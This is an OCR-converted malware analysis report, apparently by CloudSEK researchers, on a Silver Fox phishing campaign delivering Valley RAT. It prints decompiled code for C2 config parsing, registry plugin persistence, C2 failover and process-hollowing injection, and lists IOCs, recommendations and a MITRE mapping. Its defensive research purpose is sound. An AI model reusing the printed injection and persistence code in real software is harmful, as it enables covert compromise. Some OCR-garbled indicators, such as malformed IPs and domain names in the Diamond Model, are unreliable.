memcpy(Buffer_3, Buffer_2, Size); 

for ( i = 0; i < Size; ++i ) 

*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); 

fwrite(Buffer_3, 1u, Size, Stream); 

free(Buffer_3);<｜end▁of▁sentence｜>
  

The LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\data.db), and applies a lightweight custom obfuscation before writing it to disk.

<--- Page Split --->
<｜end▁of▁sentence｜>

<center>Encrypted Payload in memory </center>  

The injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  

E8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 "u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  

Looking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  

Binary 

Shellcode: Donut(0.9.2)[x86] 

S ?<｜end▁of▁sentence｜>
  

We can dump the Donut payload by using tools like undonut or donut- decryptor.  

## Stage - 4 : Valley RAT  

After the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.

<--- Page Split --->
if (!byte_41DA8C ) 

{

byte_41DA8C = 1;

_wcsrev(a0Db1k1Hs0ld0L);

memset(&src, 0, 0x12A0u);

sub_405D70('L"p1:", Source, 0);

sub_405D70('L"o1:", Source_2, 0);

sub_405D70('L"t1:", 0, (int)&dword_41CA30);

sub_405D70('L"p2:", Source_0, 0);

sub_405D70('L"o2:", Source_1, 0);

sub_405D70('L"t2:", 0, (int)&dword_41CC70);

sub_405D70('L"p3:", Source_3, 0);

sub_405D70('L"o3:", Source_4, 0);

sub_405D70('L"t3:", 0, (int)&dword_41CE80);

sub_405D70('L"dd:", word_41CEF0, 0);

sub_405D70('L"cl:", word_41CF2C, 0);

sub_405D70('L"bb:", &word_41CF4, 0);

sub_405D70('L"bb:", &word_41CFF4, 0);

sub_405D70('L"jp:", 0, (int)&unk_41D058);

sub_405D70('L"sx:", 0, (int)&unk_41D05C);

sub_405D70('L"bh:", 0, (int)&unk_41D060);

sub_405D70('L"ll:", 0, (int)&unk_41D064);

sub_405D70('L"dl:", 0, (int)&unk_41D06C);

sub_405D70('L"bd:", 0, (int)&unk_41D074);

//"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|"

**Primary C2**

**Tertiary C2**

**Delay**

**Interval**

**Build Version**

**Download**

**Shell**

**Keylogger**

**Backdoor**<｜end▁of▁sentence｜>

<center>C2 Configuration </center>  

The function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  

## Stage 1  

## Command & Control Infrastructure (9 parameters):  

- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  

## Operational Parameters (5 parameters):  

- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  

## Feature Flags (8 boolean parameters):  

- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  

## Stage 2  

After loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:

<--- Page Split --->
cbData = 0; 

if (!RegOpenKeyExW(HKEY_CURRENT_USER, L"Console", 0, KEY_READ, &phkResult))
RegQueryValueExW(phkResult, L"IpDate", 0, &Type, 0, &cbData); 

if ( cbData > 0xA ) 

memset( 

a0Db1Lk1Hs0Ld0L, // "|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj
0, 

0x7D0u); 

RegQueryValueExW( 

phkResult, 

L"IpDate", 

0, 

&Type, 

(LPBYTE)a0Db1Lk1Hs0Ld0L, 

&cbData); 

sub_405D70(L"p1:", Source, 0); 

sub_405D70(L"o1:", Source_2, 0); 

sub_405D70(L"t1:", 0, &dword_41CA30); 

sub_405D70(L"p2:", Source_0, 0); 

sub_405D70(L"o2:", Source_1, 0); 

sub_405D70(L"t2:", 0, &dword_41CC70); 

sub_405D70(L"p3:", Source_3, 0); 

sub_405D70(L"o3:", Source_4, 0); 

sub_405D70(L"t3:", 0, &dword_41CEB0);<｜end▁of▁sentence｜>

<center>Persistence </center>  

If the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  

After the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  

while ( 1 ) 

{

nullsub_1();

if ( C2_TOGGLE_FLAG )

wcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);

wcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);

connection_type_flag = config_t2_secondary_type;

else

// Use Primary C2 Config

wcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);

wcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);

connection_type_flag = config_t1_primary_type;

C2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;

if ( ++failed_connection_counter == 200 )

nullsub_1();

wcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);

wcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);

connection_type_flag = config_t3_tertiary_type;

failed_connection_counter = 0;

if ( v2 )

(**void (_thiscall ***)(void *))v2)(v2);

v2 = (void *)v15;

if ( connection_type_flag != 1 )<｜end▁of▁sentence｜>
  

The communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  

Upon successful connection, Valley RAT sends a "ready" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary

<--- Page Split --->

tiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  

if (!RegCreateKeyW(HKEY_CURRENT_USER, L"Console\\0", &hKey)) 

{

RegDeleteValueW(hKey, L"d33f351a4aeea5e608853d1a56661059");

RegSetValueExW(hKey, L"d33f351a4aeea5e608853d1a56661059", 0, REG_BINARY, (const BYTE *)dst, cbData);

}

RegCloseKey(hKey);

operator delete[](dst);

}

ArgList_1 = ArgLista;

v8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);

goto LABEL_21;

type = 3;

bData = 0;

if (!RegOpenKeyExW(HKEY_CURRENT_USER, L"Console\\0", 0, KEY_READ, &phkResult))

RegQueryValueExW(phkResult, L"d33f351a4aeea5e608853d1a56661059", 0, &Type, 0, &cbData);

if ( cbData > 0xA44 )

dst_1 = (char *)operator new[](cbData);

memset(dst_1, 0, cbData);

if (!RegQueryValueExW(phkResult, L"d33f351a4aeea5e608853d1a56661059", 0, &Type, (LPBYTE)dst_1, &cbData))

{

qmemcpy(&dst_, dst_1, 0xA44u);

lpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

memcpy_0(lpAddress, dst_1 + 2628, Size);

}

hKey_1 = hKey;

}

RegCloseKey(phkResult);

ArgList_1 = ArgLista;<｜end▁of▁sentence｜>
  

Valley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\Console\0\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  

Each plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  

GetSystemDirectoryA(Buffer, @xFFu); 

Buffer[3] = 0; 

sub_4059F0("%s%s", Buffer, "Windows\\SysWOW64\\tracerpt.exe"); 

if ( GetFileAttributesA(Buffer) == -1 ) 

Buffer[3] = 0; 

sub_4059F0("%s%s", Buffer, "Windows\\System32\\tracerpt.exe"); 

result = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); 

if ( result ) 

lpBaseAddress = VirtualAllocEx( 

lpProcessInformation->hProcess, 0, 

dwSize, 

MEM_COMMIT | MEM_RESERVE, 

PAGE_EXECUTE_READWRITE); 

if ( lpBaseAddress 

&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) 

&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) 

&& (hThread_1 = lpProcessInformation->hThread, 

Context.Eip = (DWORD)lpBaseAddress, 

SetThreadContext(hThread_1, &Context)) ) 

{ 

ResumeThread(lpProcessInformation->hThread); 

return 1;<｜end▁of▁sentence｜>

<center>Tracerpt Injection </center>  

After downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  

## Pivoting  

Let's start with the C2 embedded within the decoy document "ggwk[.]cc".

<--- Page Split --->
<｜end▁of▁sentence｜>
  

The C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  

<｜end▁of▁sentence｜>


<--- Page Split --->

We found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  

<｜end▁of▁sentence｜>
  

## Diamond Model  

## ADVERSARY 

Threat Actor: Silver Fox APT 

Attribution Confidence: High 

Rationale: 

Raze of income-tax-themed lures previously observed in Silver Fox operations 

NGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain 

Motivations: Espionage / long-term access 

Sophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) 

## VICTIM 

### Target Profile 

Indian enterprises and users 

France, tax, and business-relevant personas 

### Exposures 

User-level compromise escalating to persistent RAT control 

Long dwell time risk due to stealthy registry persistence 

### Operational Risk 

Silent surveillance 

Credential theft 

Selective deployment of high-risk modules only when needed 

## Silver Fox APT - IncomeTax Campaign 

### CAPABILITY 

### Initial Access 

Phishing with government-themed PDF lure 

### Execution & Loader Chain 

NESS installer 

Signed binary DLL hijacking 

Process hooking into explorer.exe 

Donut-generated in-memory loader 

### Stage 4: Valley RAT Core 

Two-stage configuration system (embedded + registry override) 

22-parameter operational config 

Multi-tier CI loop with protocol switching 

### Post-Compromise Capabilities 

Keylogging (M) 

Interactive shell (sh) 

File download / upload (df) 

Full backdoor mode (xd) 

### Modular Expansion 

Plugin delivery via CI 

In-memory execution + registry persistence 

Plugin integrity checks and execution guards 

## INFRASTRUCTURE 

Initial Redirect / Decoy Hosting 

gop@.ix 

IP: 45.207.231.94 

Command & Control 

N: [yuxuanow].top 

IP: 103.20.199.2147 

Plotted Infrastructure (Shared Favorites / Patrolled Domains) 

lald.club = 45.207.231.107 

gov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 

xqghw.com = 8.217.9.165 

dngtaki.cn = 47.239.225.43 

hiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 

sec2020gb.cn, 2025wmm.cn = 43.100.123.207 

hiko.wark = 43.100.63.145 

### ASN reuse over time: AS112839, AS149801 

### Design Characteristics 

Three-tier failover with retry thresholds (200 failures) 

Mixed protocol support (HTTPs) + two TCPs 

Registry-driven dynamic CI updates 

Resilience Features<｜end▁of▁sentence｜>


<--- Page Split --->

## Impact  

High risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  

## Recommendations  

Monitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\Console\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \(\leftrightarrow\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  

## Appendix  

## IOCs  

<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>

<--- Page Split --->


<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>

# Silver Fox Infrastructure Found After Pivoting

<table><tr><td>Indicator Type</td><td>Indicator</td><td>IP Address</td></tr><tr><td>Domain</td><td>itdd[.]club</td><td>45.207.231[.]107</td></tr><tr><td>Domain</td><td>xzghej[.]com</td><td>8.217.9[.]165</td></tr><tr><td>Domain</td><td>gov-a[.]work</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>gov-a[.]fit</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>gvo-b[.]club</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>gov-c[.]club</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>gov-a[.]club</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>govk[.]club</td><td>160.124.9[.]103</td></tr><tr><td>Domain</td><td>dingtalki[.]cn</td><td>47.239.225[.]43</td></tr><tr><td>Domain</td><td>hhioo[.]cn</td><td>43.100.22[.]158</td></tr><tr><td>Domain</td><td>kkyui[.]club</td><td>43.100.22[.]158</td></tr><tr><td>Domain</td><td>hihmm[.]work</td><td>43.100.22[.]158</td></tr><tr><td>Domain</td><td>swjc2025bjkb[.]cn</td><td>43.100.123[.]207</td></tr><tr><td>Domain</td><td>2025swmm[.]cn</td><td>43.100.123[.]207</td></tr></table>

<--- Page Split --->


<table><tr><td>Indicator Type</td><td>Indicator</td><td>IP Address</td></tr><tr><td>Domain</td><td>hhiioo[.]work</td><td>43.100.63[.]145</td></tr></table>

# MITRE Mapping

<table><tr><td>ATT&CK<br>Tactic</td><td>Technique<br>ID</td><td>Technique Name</td><td>Evidence from Report</td></tr><tr><td>Initial Access</td><td>T1566.001</td><td>Phishing: Spearphishing<br>Attachment</td><td>Income-tax themed PDF delivered<br>via email</td></tr><tr><td>Initial Access</td><td>T1204.002</td><td>User Execution: Malicious<br>File</td><td>User opens PDF leading to payload<br>download</td></tr><tr><td>Execution</td><td>T1059</td><td>Command and Scripting<br>Interpreter</td><td>NSIS installer-driven execution<br>logic</td></tr><tr><td>Execution</td><td>T1106</td><td>Native API</td><td>Use of GetTempPathA,<br>VirtualAllocEx,<br>WriteProcessMemory</td></tr><tr><td>Execution</td><td>T1129</td><td>Shared Modules</td><td>Signed Thunder.exe loads<br>malicious DLL</td></tr><tr><td>Execution</td><td>T1620</td><td>Reflective Code Loading</td><td>Donut-generated shellcode<br>executed entirely from memory</td></tr><tr><td>Persistence</td><td>T1547.001</td><td>Registry Run Keys / Startup<br>Folder</td><td>Registry-stored plugins persist<br>across reboots</td></tr><tr><td>Persistence</td><td>T1112</td><td>Modify Registry</td><td>Configuration and plugins stored<br>as REG_BINARY values</td></tr><tr><td>Defense<br>Evasion</td><td>T1574.001</td><td>DLL Search Order Hijacking</td><td>Malicious libexpat.dll loaded from<br>writable directory</td></tr><tr><td>Defense<br>Evasion</td><td>T1218</td><td>Signed Binary Proxy<br>Execution</td><td>Abuse of digitally signed third-<br>party binary</td></tr><tr><td>Defense<br>Evasion</td><td>T1027</td><td>Obfuscated Files or<br>Information</td><td>Encrypted payload (box.ini)<br>decrypted at runtime</td></tr><tr><td>Defense<br>Evasion</td><td>T1497</td><td>Virtualization/Sandbox<br>Evasion</td><td>Anti-debugging, resource checks,<br>sandbox detection</td></tr><tr><td>Defense<br>Evasion</td><td>T1562.001</td><td>Disable or Modify Tools</td><td>Stops Windows Update service<br>(wuauserv)</td></tr><tr><td>Discovery</td><td>T1057</td><td>Process Discovery</td><td>Enumerates processes to detect<br>analysis tools</td></tr></table>

<--- Page Split --->


<table><tr><td>ATT&amp;CKTactic</td><td>Technique ID</td><td>Technique Name</td><td>Evidence from Report</td></tr><tr><td>Discovery</td><td>T1082</td><td>System Information Discovery</td><td>System resource and environment checks</td></tr><tr><td>Command and Control</td><td>T1071.001</td><td>Web Protocols</td><td>HTTP/HTTPS C2 communication</td></tr><tr><td>Command and Control</td><td>T1095</td><td>Non-Application Layer Protocol</td><td>Raw TCP socket C2 supported via t* flags</td></tr><tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>Plugins and modules delivered from C2</td></tr><tr><td>Command and Control</td><td>T1573</td><td>Encrypted Channel</td><td>Encrypted configuration and payloads</td></tr><tr><td>Command and Control</td><td>T1008</td><td>Fallback Channels</td><td>Three-tier C2 with failover after connection failures</td></tr><tr><td>Command and Control</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>Keylogging and command responses sent over C2</td></tr><tr><td>Collection</td><td>T1056.001</td><td>Input Capture: Keylogging</td><td>Keylogger enabled via kl feature flag</td></tr><tr><td>Impact</td><td>T1489</td><td>Service Stop</td><td>Windows Update service disabled</td></tr></table>

# References

·*Intelligence source and information reliability- Wikipedia

·#Traffic Light Protocol- Wikipedia

·https://x.com/malwrhunterteam/status/2002002468612280755

·https://archive.ph/TJFVy

·Valley RAT

·https://www.sequite.com/blog/indian-income-tax-themed-phishing-campaign-targets-local-businesses/

<--- Page Split --->
<｜end▁of▁sentence｜>
  

Prajwal Awasthi  

Prajwal is a Malware Analyst at Cloudsek, specializing in reverse engineering and threat intelligence. He focuses on uncovering new threats through malware research, with a background in Offensive Security and Windows Internals.  

<｜end▁of▁sentence｜>
  

Koushik Pal  

Threat Researcher at CloudSEK, specializing in digital forensics, incident response, and adversary hunting to uncover attacker motives, methods, and operations.

<--- Page Split --->

# 1.1.1.1.1.1.1.1.1.1.1

<--- Page Split --->
